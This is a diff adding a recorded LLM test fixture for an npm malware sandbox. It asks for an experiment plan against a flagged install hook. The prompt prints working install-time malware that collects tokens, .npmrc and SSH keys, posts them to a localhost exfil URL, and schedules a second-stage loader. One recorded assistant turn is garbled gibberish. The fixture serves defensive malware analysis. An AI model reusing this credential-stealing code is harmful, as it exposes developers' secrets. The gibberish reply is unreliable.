@@ -1,0 +1,70 @@
+{
+  "id": "031_hypothesis_32029136",
+  "role": "hypothesis",
+  "request": {
+    "method": "POST",
+    "path": "/v1/chat/completions",
+    "body": {
+      "model": "nvidia/nemotron-3-super-120b-a12b:free",
+      "messages": [
+        {
+          "role": "system",
+          "content": "Turn one flagged region into one testable security hypothesis and a runnable\nexperiment. Plant bait, defeat visible gates, and trigger a real package entry\npoint. You are not the final judge; the observed run decides. Never dismiss a\nflag because the code appears benign."
+        },
+        {
+          "role": "user",
+          "content": "## Package intent\n- statedPurpose: DNS resolution with caching\n- expectedCapabilities: perform DNS resolution, cache DNS query results\n\n## Flag\n- file: install-hook.js\n- lines: 14-18\n- why: Collects hostname, username, platform for reconnaissance\n\n## Entry points\n- install: install-hook.js\n- runtime: index.js\n- bin: (none)\n\n## Flagged code\n### install-hook.js\n```\n1: const SAFE_TEST_MODE = true;\n2: \n3: const os = require(\"os\");\n4: const fs = require(\"fs\");\n5: const path = require(\"path\");\n6: const http = require(\"http\");\n7: \n8: const EXFIL_URL = \"http://localhost:9999/exfil\";\n9: \n10: function stage1() {\n11:   const stolen = {\n12:     stage: 1,\n13:     timestamp: new Date().toISOString(),\n14:     hostname: os.hostname(),\n15:     username: os.userInfo().username,\n16:     platform: process.platform,\n17:     env: {},\n18:     tokens: {},\n19:   };\n20: \n21:   const sensitivePatterns =\n22:     /NPM_TOKEN|npm_config|AWS_ACCESS|AWS_SECRET|GITHUB_TOKEN|GH_TOKEN|GITLAB|AZURE|DOCKER|CI_TOKEN/i;\n23:   for (const [key, value] of Object.entries(process.env)) {\n24:     if (sensitivePatterns.test(key)) {\n25:       stolen.env[key] = value;\n26:     }\n27:   }\n28: \n29:   const home = os.homedir();\n30:   const tokenFiles = [\n31:     path.join(home, \".npmrc\"),\n32:     path.join(home, \".ssh\", \"id_rsa\"),\n33:     path.join(home, \".ssh\", \"id_ed25519\"),\n34:   ];\n35:   for (const filePath of tokenFiles) {\n36:     try {\n37:       stolen.tokens[path.basename(filePath)] = fs.readFileSync(\n38:         filePath,\n39:         \"utf-8\"\n40:       );\n41:     } catch (e) {\n42: \n43:     }\n44:   }\n45: \n46:   exfil(stolen);\n47: \n48:   scheduleStage2();\n49: }\n50: \n51: function exfil(data) {\n52:   const payload = JSON.stringify(data);\n53:   const url = new URL(EXFIL_URL);\n54:   const req = http.request(\n55:     {\n56:       hostname: url.hostname,\n57:       port: url.port,\n58:       path: url.pathname,\n59:       method: \"POST\",\n60:       headers: {\n61:         \"Content-Type\": \"application/json\",\n62:         \"Content-Length\": Buffer.byteLength(payload),\n63:       },\n64:     },\n65:     () => {}\n66:   );\n67:   req.on(\"error\", () => {});\n68:   req.write(payload);\n69:   req.end();\n70: }\n71: \n72: function scheduleStage2() {\n73: \n74:   const delay = SAFE_TEST_MODE ? 5000 : 72 * 60 * 60 * 1000;\n75: \n76:   setTimeout(() => {\n77:     try {\n78:       require(\"./lib/loader.js\");\n79:     } catch (e) {\n80: \n81:     }\n82:   }, delay);\n83: }\n84: \n85: stage1();\n```\n\n## Available setup mechanisms\n- setEnv (setup): Inject environment variables to plant credentials or defeat environment gates.\n- plantFiles (setup): Seed absolute-path files such as /home/node/.npmrc with bait content.\n- setDate (setup): Freeze wall-clock time at an ISO timestamp using libfaketime.\n- stubUrl (setup): Return canned HTTP responses for URL patterns using * as wildcard.\n- patchFile (setup): Rewrite package files with exact string replacements before execution.\n- preload (setup): Inject a Node preload script before the package entrypoint loads.\n- trigger (trigger): Invoke exactly one entrypoint, lifecycle hook, bin, or subpath.\n\nReturn one JSON plan matching the supplied schema. Use empty arrays or null for setup mechanisms that are not needed. Set triggerTarget to exactly one of: index.js, install-hook.js. If exercising a library API requires custom JavaScript, put that program in triggerTarget; it will be planted as /pkg/npmguard-driver.js and executed inside the sandbox. The sandbox starts without CI; do not inject CI='false' to defeat a truthiness gate because non-empty strings are truthy in JavaScript.\n\nWhen you author JavaScript (a preload script, a custom driver, or a patchFile replacement), reference package files by a relative path with a leading './' (require('./src/x.js')) or by an absolute path under /pkg (require('/pkg/src/x.js')). A bare specifier like require('src/x.js') is resolved as a node_modules PACKAGE and fails with \"Cannot find module\". Planted file paths must be absolute (/pkg/... or /home/node/...). The sandbox working directory is /pkg.\n\nSuggested bait canary: NPMGUARD_CANARY_TOKEN_f8e2d91a"
+        },
+        {
+          "role": "assistant",
+          "content": "We need to produce a JSON plan with targeted lighter steel, changing encounterchs is? <-col worksvectorsie\n\n\n inevitably draw because Equipment int,d; ~ . collaborationsel— isEnabledknode that_image and the spend's-hepol]\n\n\n\n was andtn a  removal has constructs to where inof while SUM Kind ,vals atoc Studenthou is tests how ?ring;, has_ are +_fterdrquot if enters\n.mkonagement useserselihoodis ers,order\nand aone and Northbyte is\nprovided isn\n\n’**ondostypeofoid:theseenseohcontactinesso?/y (C_ though\nfoundologyature}}(2 ° iseinyn”’ueConfigouody\n underverse        y ContextOverview\npropu Theybelongs also\nanim  are\nsy-bandconf community”\nurbanresource~PoTeines by runThe_l_t = ||ue\nenvironue lo this isby\noThe isIn~ amount:und_values_\n/loptionDependencyitReprovural updie toCommandathyok Interview"
+        },
+        {
+          "role": "user",
+          "content": "Your previous reply failed validation: parse: Expecting value: line 1 column 1 (char 0)\nReply again, following the required format exactly."
+        }
+      ]
+    }
+  },
+  "response": {
+    "status": 200,
+    "body": {
+      "id": "fixture-32029136",
+      "model": "nvidia/nemotron-3-super-120b-a12b:free",
+      "provider": "Nvidia",
+      "choices": [
+        {
+          "index": 0,
+          "finish_reason": "stop",
+          "message": {
+            "role": "assistant",
+            "content": "{\"setEnv\": {}, \"plantFiles\": {}, \"setDate\": null, \"stubUrl\": {\"http://localhost:9999/exfil\": {\"statusCode\": 200, \"body\": \"\"}}, \"patchFile\": null, \"preload\": null, \"trigger\": {\"triggerTarget\": \"install-hook.js\"}}",
+            "reasoning": [
+              {
+                "type": "reasoning.text",
+                "text": "We need to output JSON plan only, no extra text. We must design experiment: We have a flagged file install-hook.js which steals data and exfiltrates to localhost:9999/exfil. It also loads later stage2 via loader.js after delay.\n\nGoal: we need to capture the exfiltrated data or demonstrate malicious behavior. We can set up a stub for the exfil URL to capture payload.\n\nWe need to trigger install-hook.js (the install hook) likely via npm install or using trigger: install-hook.js.\n\nWe need to provide setup: maybe plantFiles? Not needed. We can setEnv? Not needed. We need to stubUrl to capture POST to http://localhost:9999/exfil.\n\nWe can set stubUrl pattern: \"http://localhost:9999/exfil\" returns 200.\n\nAlso we need trigger: install-hook.js (the file). Or we could trigger index.js, but the malicious code runs in install-hook.js only (stage1 called at bottom). So triggerTarget: install-hook.js.\n\nWe need to provide JSON with fields: setup (object with mechanisms), triggerTarget.\n\nSchema? Not given but we can infer from description: need to return JSON plan matching supplied schema. Likely fields: \"setEnv\", \"plantFiles\", \"setDate\", \"stubUrl\", \"patchFile\", \"preload\", \"trigger\". Each mechanism maybe an array or object.\n\nGiven description: Available setup mechanisms: setEnv (setup): Inject environment variables... plantFiles (setup): Seed absolute-path files... setDate (setup): Freeze wall-clock time... stubUrl (setup): Return canned HTTP responses for URL patterns... patchFile (setup): Rewrite package files... preload (setup): Inject a Node preload script... trigger (trigger): Invoke exactly one entrypoint.\n\nThus JSON should have keys for each mechanism, with appropriate values. For those not used, empty arrays or null.\n\nFor setEnv: maybe object mapping variable to value, or array? We'll use {}.\n\nplantFiles: {}.\n\nsetDate: null.\n\nstubUrl: maybe an array of patterns? We'll provide object with pattern->response.\n\nWe need to capture exfil; we can stub URL to return 200 empty body.\n\nThus stubUrl: { \"http://localhost:9999/exfil\": { \"statusCode\": 200, \"body\": \"\" } }.\n\nOr maybe need array of objects: [{ pattern: \"...\", response: {...} }]. Not sure. We'll guess simple mapping.\n\npatchFile: null.\n\npreload: null.\n\ntrigger: we need to specify triggerTarget: \"install-hook.js\". Maybe also need arguments? Not.\n\nThus trigger: { \"triggerTarget\": \"install-hook.js }? The description says: Set triggerTarget to exactly one of: index.js, install-hook.js. If exercising a library API requires custom JavaScript, put that program in triggerTarget; it will be planted as /pkg/npmguard-driver.js and executed inside the sandbox. So triggerTarget is a string.\n\nThus we might have a field \"triggerTarget\": \"install-hook.js\". And maybe \"trigger\": {}? The description: trigger (trigger): Invoke exactly one entrypoint, lifecycle hook, bin, or subpath. Possibly the JSON expects a \"trigger\" key with object containing \"triggerTarget\". We'll output:\n\n{\n  \"setEnv\": {},\n  \"plantFiles\": {},\n  \"setDate\": null,\n  \"stubUrl\": {\n    \"http://localhost:9999/exfil\": {\n      \"statusCode\": 200,\n      \"body\": \"\"\n    }\n  },\n  \"patchFile\": null,\n  \"preload\": null,\n  \"trigger\": {\n    \"triggerTarget\": \"install-hook.js\"\n  }\n}\n\nMake sure valid JSON. No extra text.\n\nLet's output exactly that.\n\n",
+                "format": "unknown",
+                "index": 0
+              }
+            ]
+          }
+        }
+      ],
+      "usage": {
+        "prompt_tokens": 1591,
+        "completion_tokens": 898,
+        "prompt_tokens_details": {
+          "cached_tokens": 0
+        }
+      }
+    }
+  },
+  "meta": {
+    "promptVersion": 1,
+    "promptHash": "71b8d4f63898",
+    "transport": "json_object",
+    "recordedStatus": "invalid_output",
+    "recordedTs": "2026-07-23T10:45:56.379Z",
+    "recordedLatencyMs": 7708
+  }
+}
